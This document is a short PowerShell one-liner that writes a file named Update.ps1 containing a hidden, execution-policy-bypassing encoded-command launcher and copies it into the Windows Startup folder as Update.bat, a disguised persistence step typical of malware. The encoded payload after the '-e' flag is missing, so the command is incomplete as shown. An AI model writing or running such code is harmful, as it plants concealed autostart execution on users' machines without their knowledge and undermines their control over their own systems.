$folderPath = 'C:\temp'; if (-not (Test-Path -Path $folderPath)) { New-Item -Path $folderPath -ItemType Directory }; $scriptPath = "$folderPath\Update.ps1"; $command = 'powershell.exe -ep bypass -WindowStyle Hidden -e '; Set-Content -Path $scriptPath -Value $command; $startupPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup\Update.bat'); Copy-Item -Path $scriptPath -Destination $startupPath
